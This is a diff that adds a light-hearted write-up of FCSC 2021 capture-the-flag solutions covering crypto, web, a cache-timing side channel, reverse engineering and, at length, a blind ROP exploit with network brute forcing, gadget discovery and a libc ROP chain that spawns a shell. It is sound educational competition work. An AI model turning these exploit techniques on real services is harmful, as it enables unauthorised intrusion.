@@ -1,0 +1,918 @@
+﻿# FCSC 2021
+
+Now this is a story all about how  my life got flipped, turned upside down , and I'd like to take a minute, just sit right there,  I'll tell you how I  ~~became the prince of a town called Bel-Air~~ solve most of my challenges.
+
+![Fresh Prince](https://i.pinimg.com/originals/3b/7c/52/3b7c52fe60f526f17547ab260bc1e608.gif)
+
+Friday the 23th of April, I remember it as if it was yesterday.
+The sun was as bright as heaven, a slew of swallows have just passed under my window.
+I was haggard and navigated through my boredom.
+When suddenly, the spark, at that moment I remembered that there was a reason behind my lack of occupations.
+
+The FCSC was about to start, each potential adversary proudly displayed his belonging to his cause, like the undisputed master of his discipline ready to slay the evil passing within reach of arms.
+
+Then it started, all I can remember was the sound, like a hammer screaming through my whole soul, a last spirit calling for help: "Félicitations à `DSpiricate` pour avoir résolu `Bienvenue` ! ".
+
+At that time I was not ready, but neither was I helpless.
+
+I took my caprisun, logged on and began to type vigorously the first line of this epic on my keyboard.
+
+## Cryptography
+
+In retrospect this is the category where I spent the most time and the one I have the most regrets. More ~~in the next episode~~ later on.
+
+
+### Lost Curve
+
+This challenge is about recovering $a$, $b$ and $p$ from two point, $P$ and $Q$ , over an elliptic curve.
+We know that $Q = 2P$.
+
+From the wikipedia article [elliptic curve point doubling](https://en.wikipedia.org/wiki/Elliptic_curve_point_multiplication#Point_doubling) we know that for $P + P = Q$
+
+$$\lambda = \frac{3x_p^2 + a}{2y_p}$$
+
+$$x_q = \lambda^2 - 2x_p$$
+
+$$y_q = \lambda(x_p - x_q) - y_p$$
+
+So we can write
+
+$$\lambda^2 - 2x_p \equiv x_q \bmod p$$
+
+$$ \lambda * (x_p - x_q) - y_p \equiv y_q \bmod p$$
+
+We also know this
+
+$$y_p^2 \bmod p = x_p^3 + ax_p + b \bmod p$$
+
+$$y_q^2 \bmod p = x_q^3 + ax_q + b \bmod p$$
+
+So
+
+$$a x_p + p_x^3 - y_p^2 + b \equiv 0 \bmod p$$
+
+$$a x_q + x_q^3 - y_q^2 + b \equiv 0 \bmod p$$
+
+$$a (x_p - x_q)  + p_x^3 - x_q^3 + y_q^2 - y_p^2 \equiv  0 \bmod p$$
+
+And
+
+$$2y_p(y_q + y_p)(x_p - x_q)^{-1} - 3p_x^2 \equiv a \bmod p$$
+
+$$a * (x_p - x_q) \equiv 2y_p(y_q + y_p) - 3p_x^2(x_p - x_q) \bmod p$$
+
+$$a * (x_p - x_q) - 2y_p(y_q + y_p) - 3p_x^2(x_p - x_q)\equiv 0 \bmod p$$
+
+Then we can use $P$ and $Q$
+
+$$a * 223947800784872046728541 -373643754591624343961399513549268713118218577620028192683665984300940844 \equiv 0 \bmod p$$
+
+$$a * 223947800784872046728541 -272670973033496745462375227964793651005730241280891435513738442680890779 \equiv 0 \bmod p$$
+
+
+
+$$373643754591624343961399513549268713118218577620028192683665984300940844 - 272670973033496745462375227964793651005730241280891435513738442680890779 \equiv 0 \bmod p$$
+
+$$100972781558127598499024285584475062112488336339136757169927541620050065 \equiv 0 \bmod p$$
+
+We just need to factor this number to get $p$ and compute $a$ and $b$ from this for every factor of $p$ until we have a solution.
+
+Once implemented the whole script looks like this.
+
+```python
+from sage.all import factor
+from pwn import remote
+
+r = remote("challenges1.france-cybersecurity-challenge.fr", 6002)
+
+r.readuntil(b"I will give you two points:\n")
+P = list(map(int, r.readline()[5:-2].split(b', ')))
+Q = list(map(int, r.readline()[5:-2].split(b', ')))
+  
+print("[!] P:", P)
+print("[!] Q:", Q)
+  
+eq1_1, eq1_2 = P[0] - Q[0], (Q[1] * 2 * P[1] + P[1] * 2 * P[1]) - (3 * P[0] ** 2) * (P[0] - Q[0])
+print("(a * %d) %% p == %d  %% p" % (eq1_1, eq1_2))
+  
+eq2_1, eq2_2 = P[0], P[0]**3 - P[1] ** 2
+# print("(a * %d + %d + b) %% p == 0" % (eq2_1, eq2_2))
+  
+eq3_1, eq3_2 = Q[0], Q[0]**3 - Q[1] ** 2
+# print("(a * %d + %d + b) %% p == 0" % (eq3_1, eq3_2))
+  
+eq4_1, eq4_2 = eq2_1 - eq3_1, eq3_2 - eq2_2
+print("(a * %d) %% p == %d  %% p" % (eq4_1, eq4_2))
+  
+eq5 = eq4_2 - eq1_2
+  
+print("%d %% p == 0" % eq5)
+  
+ps = [ int(p[0]) for p in factor(eq5) if  int(p[0]).bit_length() == 80 ]
+  
+for p in ps:
+	print("[+] p:", p)
+
+	a = eq1_2 * pow(eq1_1, -1, p) % p
+	print("[+] a:", a)
+	r.readuntil(b">>> a = ")
+	r.sendline(b"%d" % a)
+
+	b = (P[1] ** 2 - P[0]**3 - a * P[0]) % p
+	print("[+] b:", b)
+	r.readuntil(b">>> b = ")
+	r.sendline(b"%d" % b)
+
+	r.readuntil(b">>> p = ")
+	r.sendline(b"%d" % p)
+
+	r.readline()
+	print("[+] flag: %s" % r.readline()[:-1])
+```
+
+```bash
+$ python3 solv.py
+[+] Opening connection to challenges1.france-cybersecurity-challenge.fr on port 6002: Done
+[!] P: [673701975104420552579391, 230136812401492282781496]
+[!] Q: [285805956735650947169477, 330799075618486991458061]
+(a * 387896018368769605409914) % p == -528168161079918415503252361199803268159378375049255830426997044270788158 % p
+(a * 387896018368769605409914) % p == -282429974482594117041357553873488889261561644678722723925228760339220843 % p
+245738186597324298461894807326314378897816730370533106501768283931567315 % p == 0
+[+] p: 674458981338301907764927
+[+] a: 543620906287797754990849
+[+] b: 392691970389643361287417
+[+] flag: b'FCSC{3e244ae57e01787c60ef5d3a5c8aa87d3c945855289e40d375aad955da8f8bb4}'
+[*] Closed connection to challenges1.france-cybersecurity-challenge.fr port 6002
+```
+
+## Web
+
+Not my strongest category but I managed to score some point here and there.
+
+### Vice-VeRSA
+
+This challenge is a service that reverse a string and send it back. It uses JWT to ensure "security" but has two major flaws:
+- Because it uses the same key to encrypt every JWT you can use `gcd` to recover the modulo $N$ used when encrypting with rsa.
+- It also allows you to encrypt data with a different key  having a common prime factor, so you can again use `gcd` to get a multiple of a factor of $N$
+
+Once you got this it is trivial to recover the private key and craft a malicious token.
+
+## Misc
+
+### BattleChip
+
+This one was my favorite challenge so far, it was listed as misc but could have been pwn as well.
+The challenge was about exploiting a vulnerability similar to [Meltdown](https://en.wikipedia.org/wiki/Meltdown_(security_vulnerability)). 
+
+####  TLDR:
+You're given an architecture based on [CHIP-8](https://en.wikipedia.org/wiki/CHIP-8) that has a trusted and untrusted context. In order to get the flag you need to guess random data used inside the trusted context. The twist is you can't access the trusted context directly, but lucky for us the whole product has a major flaw.
+When doing an arithmetic and logic operation the result is stored in cache and reused when the same instruction is run. Because of this we can run instruction beforehand and guess from the number of cycle if that instruction was run by the trusted context.
+
+We've been given two interesting functions, one that xor 10 char at `I` with the random key.
+The other check if the 10 char at `I` are equal to the random key and load the flag if yes.
+
+By bruteforcing characters we leak the random data and can get the flag.
+
+#### Methodology:
+
+First we need to develop a script to simplify writing asm code, to do this I mapped instruction to python function, simple but effective.
+
+```python
+ def  _MC_INS(INS, params=None):
+	reps = [
+		"NNN",
+		"NN",
+		"N",
+		"X",
+		"Y"
+	]
+	
+	for rep in reps:
+		INS = INS.replace(rep, "%%0%dx" % len(rep))
+
+	if params is  None:
+		return INS
+	else:
+		return INS % params
+
+
+def  _call_machine_code_routine(NNN):
+	return _MC_INS("0NNN", NNN)
+  
+  
+def  _clear_screen():
+	return _MC_INS("00E0")
+  
+  
+def  _return():
+	return _MC_INS("00EE")
+  
+  
+def  _jump(NNN, V0=None):
+	if V0 is  None:
+		return _MC_INS("1NNN", NNN)
+	else:
+		return _MC_INS("BNNN", NNN)
+  
+  
+def  _call(NNN):
+	return _MC_INS("2NNN", NNN)
+  
+  
+def  _eq(X, Y=None, NN=None, KEY=None):
+	if KEY is  None:
+		if Y is  None:
+			return _MC_INS("3XNN", (X, NN))
+		elif NN is  None:
+			return _MC_INS("5XY0", (X, Y))
+	else:
+		return _MC_INS("EX9E", X)
+  
+  
+def  _nz(X, Y=None, NN=None, KEY=None):
+	if KEY is  None:
+		if Y is  None:
+			return _MC_INS("4XNN", (X, NN))
+		elif NN is  None:
+			return _MC_INS("9XY0", (X, Y))
+	else:
+		return _MC_INS("EXA1", X)
+  
+  
+def  _mov(I=None, X=None, Y=None, NN=None, NNN=None):
+	if NNN is  None:
+		if Y is  None:
+			return _MC_INS("6XNN", (X, NN))
+		elif NN is  None:
+			return _MC_INS("8XY0", (X, Y))
+	else:
+		return _MC_INS("ANNN", NNN)
+  
+  
+def  _add(I=None, X=None, Y=None, NN=None):
+	if I is  None:
+		if Y is  None:
+			return _MC_INS("7XNN", (X, NN))
+		elif NN is  None:
+			return _MC_INS("8XY4", (X, Y))
+	else:
+		return _MC_INS("FX1E", X)
+  
+  
+def  _or(X, Y):
+	return _MC_INS("8XY1", (X, Y))
+  
+  
+def  _and(X, Y):
+	return _MC_INS("8XY2", (X, Y))
+  
+  
+def  _xor(X, Y):
+	return _MC_INS("8XY3", (X, Y))
+  
+  
+def  _sub(X, Y, inv=None):
+	if inv is  None:
+		return _MC_INS("8XY5", (X, Y))
+	else:
+		return _MC_INS("8XY7", (X, Y))
+  
+  
+
+def  shr(X):
+	return _MC_INS("8XY6", X)
+  
+  
+def  shl(X):
+	return _MC_INS("8XYE", X)
+  
+  
+def  _rand(X, NN):
+	return _MC_INS("CXNN", (X, NN))
+  
+  
+def  _draw(X, Y, N):
+	return _MC_INS("DXYN", (X, Y, N))
+  
+  
+def  _get_delay(X):
+	return _MC_INS("FX07", X)
+  
+  
+def  _get_key(X):
+	return _MC_INS("FX0A", X)
+  
+  
+def  _set_delay(X):
+	return _MC_INS("FX15", X)
+  
+  
+def  _set_key(X):
+	return _MC_INS("FX18", X)
+  
+  
+def  _load_sprite(X):
+	return _MC_INS("FX29", X)
+  
+  
+def  _set_BCD(X):
+	return _MC_INS("FX33", X)
+  
+  
+def  _reg_dump(X):
+	return _MC_INS("FX55", X)
+  
+  
+def  _reg_load(X):
+	return _MC_INS("FX65", X)
+  
+  
+def  _exit():
+	return _MC_INS("FFFF")
+  
+  
+def  _empty_cache():
+	return _MC_INS("00E1")
+  
+  
+def  _encrypt():
+	return _MC_INS("0000")
+  
+  
+def  _verify():
+	return _MC_INS("0001")
+```
+
+Now we can begin to write our exploit
+
+#### Exploit
+
+First we want to call the xor function with `I` set to `"0123456789"` then bruteforce for each char, the index where it appears.
+
+To do that we call a simple `xor` instruction with two value `idx` and `check` then call the main xor function and check if it was faster.
+If so that mean there is a char `check` at `idx`.
+
+Once implemented it looks like that
+
+```python
+def  set_addr_to_0123456789(addr):
+	asm = ""
+  
+	# save reg
+	asm += _mov(I=True, NNN=stack_base + 0x30)
+	asm += _reg_dump(X=0xF)
+  
+	for nb in  range(10):
+		asm += _mov(X=nb, NN=nb)
+  
+	asm += _mov(I=True, NNN=addr)
+	asm += _reg_dump(X=0x9)
+  
+	# load reg
+	asm += _mov(I=True, NNN=stack_base + 0x30)
+	asm += _reg_load(X=0xF)
+  
+	return asm
+
+
+def  bf_char(idx, addr, pc):
+	asm = ""
+  
+	# save reg
+	asm += _mov(I=True, NNN=stack_base + 0x40)
+	asm += _reg_dump(X=0xF)
+  
+	# V0xD will be our idx
+	asm += _mov(X=0xd, Y=idx)
+  
+	# set V0xe to -1
+	asm += _mov(X=0xe, NN=0xff)
+  
+	# label _loop
+	_loop = 0x0200 + pc + len(asm) // 2
+  
+	# incr V0xe
+	asm += _add(X=0xe, NN=1)
+  
+	# reset cache
+	asm += _empty_cache()
+	# fill addresse with "0123456789"
+	asm += set_addr_to_0123456789(addr=stack_base + 0x50)
+	# I will point to "0123456789"
+	asm += _mov(I=True, NNN=stack_base + 0x50)
+  
+	# do or xor with V0xd idx and V0xe our check
+	asm += _mov(X=0x0, Y=0xd)
+	asm += _mov(X=0x2, Y=0xe)
+	asm += _xor(X=0x0, Y=0x2)
+  
+	# call their xor function
+	asm += _encrypt()
+  
+	# check the number of cycle
+	asm += _eq(X=0xf, NN=61)
+	# if that different than 61 its mean we found key[idx] = check
+	asm += _jump(NNN=rom_base + pc + (len(asm) + 4 * 4) // 2)
+  
+	# if counter at 255
+	asm += _eq(X=0xe, NN=0xff)
+	# if not
+	asm += _jump(NNN=_loop)
+	# if notn't 
+	asm += _jump(NNN=rom_base + pc + (len(asm) + 5 * 4) // 2)
+  
+	# save result in addr + V0xd
+	asm += _mov(X=0x0, Y=0xe)
+	asm += _mov(I=True, NNN=addr)
+	asm += _add(I=True, X=0xd)
+	asm += _reg_dump(X=0x0)
+  
+	# load reg
+	asm += _mov(I=True, NNN=stack_base + 0x40)
+	asm += _reg_load(X=0xF)
+  
+	return asm
+```
+
+We only need to write a main function that iterates for every char of random key and then print the flag
+
+```python
+def  _print_reg(reg_idx, x=None, y=None):
+	asm = ""
+  
+	# save reg
+	asm += _mov(I=True, NNN=stack_base + 0x20)
+	asm += _reg_dump(X=0xF)
+  
+	# save reg_idx
+	asm += _mov(X=0xA, Y=reg_idx)
+  
+	# set x, y
+	if x is  None:
+		asm += _mov(X=0xB, NN=0)
+	else:
+		asm += _mov(X=0xB, Y=x)
+	if y is  None:
+		asm += _mov(X=0xC, NN=0)
+	else:
+		asm += _mov(X=0xC, Y=y)
+  
+	# load reg decimals value
+	asm += _mov(I=True, NNN=stack_base + LEN_FLAG)
+	asm += _set_BCD(X=reg_idx)
+	asm += _reg_load(X=0x2)
+  
+	# set load font at index
+	asm += _load_sprite(X=0x0)
+	# draw font
+	asm += _draw(X=0xB, Y=0xC, N=0x5)
+	asm += _add(X=0xB, NN=0x6)
+  
+	# set load font at index
+	asm += _load_sprite(X=0x1)
+	# draw font
+	asm += _draw(X=0xB, Y=0xC, N=0x5)
+	asm += _add(X=0xB, NN=0x6)
+  
+	# set load font at index
+	asm += _load_sprite(X=0x2)
+	# draw font
+	asm += _draw(X=0xB, Y=0xC, N=0x5)
+	asm += _add(X=0xB, NN=0x6)
+  
+	# load reg
+	asm += _mov(I=True, NNN=stack_base + 0x20)
+	asm += _reg_load(X=0xF)
+  
+	return asm
+
+  
+rom_base = 0x0200
+stack_base = 0x0EA0
+LEN_FLAG = 0x10
+IDX = 0  if  len(sys.argv) == 1  else  int(sys.argv[1])
+  
+asm = ""
+  
+# set counter at -1
+asm += _mov(X=0x0, NN=0xff)
+  
+_loop = len(asm) // 2
+  
+# incr counter
+asm += _add(X=0x0, NN=1)
+  
+# bf char at idx V0x0 and write the result to stack_base + 0x60 + V0x0
+asm += bf_char(0x0, stack_base + 0x60, pc=len(asm) // 2)
+  
+# if all ten char are done
+asm += _eq(X=0x0, NN=10)
+# if not
+asm += _jump(NNN=rom_base + _loop)
+  
+# load random_data
+asm += _mov(I=True, NNN=stack_base + 0x60)
+  
+asm += _verify()
+  
+# check if our data leak is correct
+asm += _eq(X=0xf, NN=0)
+# if not
+asm += _exit() # FAILED
+
+# load flag + IDX  
+asm += _mov(I=True, NNN=stack_base + 0x60 + 10 + IDX)
+asm += _reg_load(X=0x0)
+  
+asm += _print_reg(0x0)
+  
+  
+asm += _exit()
+```
+
+Since it isn't so long I didn't bother printing everything and run my program 16 times with different `IDX` and got the flag.
+
+## Hardware
+
+...
+pwn?
+...
+
+## PWN
+
+pwn!
+
+### Blind Date
+
+blind? rop? vasistas?!
+
+This was my first blind rop challenge and I heavlily used this [writeup](https://www.dailysecurity.fr/blind-rop-arm-securevault-writeup/) from the GOAT [Geluchat](https://twitter.com/geluchat?lang=en). The main difference being the architecture (ARM for him, x86_64 for me).
+
+First we need to find how much char we can write until the  program crashes.
+
+```bash
+$ nc challenges2.france-cybersecurity-challenge.fr 4008 < <(python3 -c "print('A' * 38)")
+Hello you.
+What is your name ?
+>>> Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Bye!
+$ nc challenges2.france-cybersecurity-challenge.fr 4008 < <(python3 -c "print('A' * 39)")
+Hello you.
+What is your name ?
+>>> Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+�@Bye!
+$ nc challenges2.france-cybersecurity-challenge.fr 4008 < <(python3 -c "print('A' * 40)")
+Hello you.
+What is your name ?
+```
+
+From there we can bruteforce our leak
+
+```python
+def  get_leak(leak=""):
+  
+	while  len(leak) < 8: # we need to bruteforce 8 bytes
+		for c in  range(256):
+			p = remote("challenges2.france-cybersecurity-challenge.fr", 4008)
+  
+			buf = "A" * 40 + leak + chr(c)
+  
+			p.readuntil(b">>> ")
+			p.send(buf)
+			resp = p.recvall(timeout=0.5)
+  
+			if  b"Bye"  in resp: # means it didn't crash
+				leak += chr(c)
+				print("[*] byte : %r" % chr(c)) # looks familiar
+				break
+  
+			p.close()
+  
+		else:
+			raise  ValueError('Failed')
+  
+	return leak
+```
+
+This got us `"\xcc\x06@\x00\x00\x00\x00\x00"` or `0x4006cc` which will be useful for our next step getting a stop gadget.
+
+
+```python
+def  get_stop_gadget(leak):
+	for i in  range(340):
+		p = remote("challenges2.france-cybersecurity-challenge.fr", 4008)
+		p.send(b'a' * 40 + p64(leak + i) )
+		resp = p.recvall(timeout=0.5).split(b"a" * 5)[-1]
+  
+		if  b"What is "  in resp:
+			print(resp)
+			return leak + i
+		p.close()
+  
+	else:
+		raise  ValueError('Failed')
+```
+
+Our stop_gadget  `0x4006b8` is used to get our brop_gadget, a gadget that looks like this
+```
+pop rbx
+pop rbp
+pop r12
+pop r13
+pop r14
+pop r15
+ret
+```
+and is located in the __libc_csu_init.
+I wrote this little function to get it:
+
+```python
+def  get_brop_gadget(leak, stop_gadget):
+	for i in  range(100, 120):
+		p = remote("challenges2.france-cybersecurity-challenge.fr", 4008)
+		p.recvuntil(b">>> ")
+		send = b'a' * 40 + p64(leak + i) + p64(0) * 6 + p64(stop_gadget)
+		p.send(send)
+  
+		resp = p.recvall(timeout=0.5)
+  
+		if  b"aaaa"  in resp:
+			return leak + i
+  
+		p.close()
+  
+	else:
+		raise  ValueError('Failed')
+```
+
+from there we can also jump to:
+
+
+```
+pop rsi
+pop r15
+ret
+```
+and
+```
+pop rdi
+ret
+```
+
+which will be useful later.
+
+We got `brop_gadget = leak + 110`, the next one we need is the read_gadget, a gadget we will use to read and dump the whole program.
+
+In order to do that we look for the only string we know for sure in the program, our brop.
+We need this time to use a `pop rdi` gadget to send our addr to our read fortunately `brop_gadget + 9`
+ do that for us. 
+```python
+def  get_read(brop_gadget, stop_gadget):
+	for i in  range(0, 200):
+		p = remote("challenges2.france-cybersecurity-challenge.fr", 4008)
+		p.send(b'a' * 40 + p64(brop_gadget + 9) + p64(brop_gadget) + p64(stop_gadget + i))
+  
+		resp = p.recvall(timeout=0.5)
+  
+		if  b"\x5b\x5d\x41\x5c\x41\x5d\x41\x5e\x41\x5f\xc3"  in resp:
+			print(resp)
+			return stop_gadget + i
+  
+		p.close()
+
+		p = remote("challenges2.france-cybersecurity-challenge.fr", 4008)
+		p.send(b'a' * 40 + p64(brop_gadget + 9) + p64(brop_gadget) + p64(stop_gadget - i))
+  
+		resp = p.recvall(timeout=0.5)
+  
+		if  b"\x5b\x5d\x41\x5c\x41\x5d\x41\x5e\x41\x5f\xc3"  in resp:
+			print(resp)
+			return stop_gadget - i
+  
+		p.close()
+  
+	else:
+		raise  ValueError('Failed')
+```
+
+We call this function, got our read_gadget `0x400500` and proceed to dump the binary
+
+```python
+def  read(addr_to_read, nb_read, brop_gadget, read_gadget):
+	p = remote("challenges2.france-cybersecurity-challenge.fr", 4008)
+	p.send(b'a' * 40 + p64(brop_gadget + 9) + p64(addr_to_read) + p64(read_gadget))
+  
+	resp = p.recvall(timeout=0.5)[85:].replace(b'\nWhat is your name ?\n>>> ', b'')
+  
+	l = len(resp)
+  
+	print(f"got {l} bytes, missing {nb_read - l - 1}")
+  
+	# we're appending a "\x00" because our read will stop at them which mean
+	# we need to read until everything is read
+	return nb_read - l - 1, resp[:nb_read] + b"\x00"
+
+def  read_prog(brop_gadget, read_gadget):
+	f = open("out.hex", "wb")
+	l = 0x2000
+	while l > 0:
+		l, res = read(0x402000 - l, l, brop_gadget, read_gadget)
+		f.write(res)
+```
+
+Now we  juste need to get the puts GOT address, then we can load our binary, and, thanks to this [site](https://libc.blukat.me/), the lib corresponding with pwntools.
+The last step is to use the ROP class to chain our exploit.
+
+```python
+def  get_shell(puts_got_addr, brop_gadget, read_gadget, main_addr):
+	p = remote("challenges2.france-cybersecurity-challenge.fr", 4008)
+	p.send(b'a' * 40 + p64(brop_gadget + 9) + p64(puts_got_addr) + p64(read_gadget) + p64(main_addr))
+  
+	p.readuntil(b">>> ")
+	t = p.read(56)[50:] + b'\x00' * 2
+	print(t)
+	resp = u64(t)
+  
+	print(f"libc_puts_addr {hex(resp)}")
+  
+	libc_puts_addr = resp
+  
+	libc = ELF("libc6_2.19-18+deb8u10_amd64.so")
+  
+	libc.address = libc_puts_addr - libc.symbols["puts"]
+  
+	print(f"libc_base {hex(libc.address)}")
+  
+	rop = ROP(libc)
+	rop.execv(next(libc.search(b"/bin/sh\x00")), 0)
+  
+	p.send(b'a' * 40 + rop.chain())
+  
+	p.interactive()
+	pass
+
+
+re_do_gadget = 0x400656 # will call read again in order to send our final payload
+ 
+get_shell(0x600FC8, brop_gadget, read_gadget, re_do_gadget)
+```
+
+and FLAG!!!!
+
+```bash
+$ python3 solv.py
+b'\x90\xd9tU\x12\x7f\x00\x00'
+libc_puts_addr 0x7f125574d990
+libc_base 0x7f12556e2000
+
+What is your name ?
+>>> $ ls
+blindDate
+flag
+$ cat flag
+FCSC{3bf7861167a72f521dd70f704d471bf2be7586b635b40d3e5d50b989dc010f28}
+```
+
+## Forensic
+
+no
+...
+won't do that
+...
+
+### Disque nuagique 2
+
+Just kidding! ahah I love forensic. Let me show you how much I love it:
+
+## Reverse
+
+Unfortunately I didn't had the time to try them all, the harder one seemed a lot of fun.
+
+### Quack Pack
+
+This one was the least solved bewteen the medium level reverse challenge, despite being the easiest (or least whacky)  if you'd ask me.
+
+It is a 32 bits PE program, where a lot of data are xored during runtime. The flag is 16 bytes and pass through three main functions, each one of them need to return a specific value in order to display the flag.
+
+I've named them in order of apparition `check1`, `check2` and `check3`.
+
+`check1`  is the only function using the whole password so we'll check this one at last.
+
+`check2` is the most trivial it take the 4 first bytes of the input, convert to an int and check if this int is equal to `0xFC5C`, from what we understand the 4 first bytes are "fc5c". 
+
+```c
+  memmove(password_4_char, password, 4u);
+  res_check2 = check2(password_4_char, 0, 16);
+  ...
+  ... && res_check2 == 0xFC5C )
+  ```
+
+`check3` was the most interesting basically it computes an int from 8 bytes from the flag. I reimplemented it in python and it looks like this:
+
+```python
+def  check3(data, len_data, start):
+	for _ in  range(len_data):
+		res = arr[(data[3 - _] ^ (start>> 24)) & 0xff] # arr is a global of 256 ints
+		start= res ^ ((start << 8) & 0xffffffff)
+	return start
+```
+
+From this we can deduce one thing, since start will be equal to `res ^ ((start << 8) & 0xffffffff)` the 2 least significatives bytes of res will be kept.
+From what we can guess what res was each round from the end to the start by iterating through `arr` and choosing the only value with the same 2 least significatives bytes. And from this store their indexes for each round
+
+```python
+t = 0x966CD31B
+idxs = []
+for _ in  range(4):
+	e = list(filter(lambda  x: x & 0xff == t & 0xff, arr))[0]
+	idx = arr.index(e)
+	t = (e ^ t) >> 8
+	idxs.append(idx)
+```
+
+the indexes need to be stored since I'll be using them for the next part.
+
+Once we got those values we can get what each char should be equal to this time starting from the first one.
+
+```python
+def  check3_p(a, nb):
+	return arr[(a ^ (nb >> 24)) & 0xff] ^ ((nb << 8) & 0xffffffff)
+
+t = 0xffffffff
+char = []
+for _ in  range(4):
+	idx = idxs[3 - _]
+	c = idx ^ ((t >> 24) & 0xff)
+	char.append(c)
+	t = check3_p(c, t)
+
+res = "".join(map(lambda  x: "%02x" % x, char[::-1]))
+print(res)
+```
+
+This return those 8 bytes: "a1130bf5".
+
+`check1` this function is xored runtime and is a bunch of switch cases on each byte, with a different operator used on a local variable.
+It make sure that this local variable is equal to `43` at the end.
+Since we already have 12 bytes we only need 4 more, I wrote a small c program in order to bruteforce every posibilities.
+```c
+int check1(char *password)
+{
+	int res;
+
+	// such big function
+	// very operations
+
+	// not really just
+	
+	return res == 43
+}
+
+int  main(void)
+{
+	char  flag[] = "fc5ca1130bf5????";
+	char  const  hexdigits[] = "0123456789abcdef";
+	for (int  a = 0; a < 16; a++)
+	{
+		flag[12] = hexdigits[a];
+		for (int  b = 0; b < 16; b++)
+		{
+			flag[13] = hexdigits[b];
+			for (int  c = 0; c < 16; c++)
+			{
+				flag[14] = hexdigits[c];
+				for (int  d = 0; d < 16; d++)
+				{
+					flag[15] = hexdigits[d];
+					if (check1(flag))
+					printf("pos: %s\n", flag);
+				}
+			}
+		}
+	}
+}
+```
+
+We run the program and got two solutions, both of them seems valid.
+
+```powershell
+> .\check1.exe
+pos: fc5ca1130bf506bb
+pos: fc5ca1130bf5860b
+> .\quackpack.exe
+Entrez la clef :
+fc5ca1130bf506bb
+Bravo!
+FCSC{3d9593ccd1400c61cd5b6e16f2b5d042cf1b24648c7497412060ef199a92bd61}
+> .\quackpack.exe
+Entrez la clef :
+fc5ca1130bf5860b
+Bravo!
+FCSC{53e2a86167a73a799e056493e5ac57952a4ba60ad266f9d217d4b6dbb48bbcbd}
+```
+
+## Acknowledgments
+
+Thanks a lot to everyone that was involved in making this CTF, as last year it was a lot of fun, I learnt a lot and I look forward for next year.
+
+But most importantly I would like to thank my parents for suporting my ape-mode during those 10 days.
